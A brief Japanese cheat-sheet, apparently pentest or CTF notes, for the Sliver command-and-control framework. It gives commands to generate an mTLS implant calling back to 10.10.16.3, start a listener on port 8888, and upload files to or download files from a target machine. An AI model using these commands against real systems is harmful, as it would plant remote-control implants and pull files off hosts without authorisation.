# # Sliver
## ## Implantの作成
```sh
# mtls
generate --mtls 10.10.16.3 --skip-symbols

# HTTP/HTTPS

# DNS
```
## ## Implantの設定を確認
```sh
sliver > implants

=================== ============== ========== =============== ============ ============================ =======

```

```sh
sliver > mtls --lport 8888

```

## ## ファイル転送
### ### アップロード
- カレントディレクトリ内のファイルをアップロードする。(C2->TargetMachine)
```sh
upload <ファイル名>
```
### ### ダウンロード
カレントディレクトリ内のファイルをダウンロードする。(TargetMachine->C2)
```sh
download <ファイル名>
```
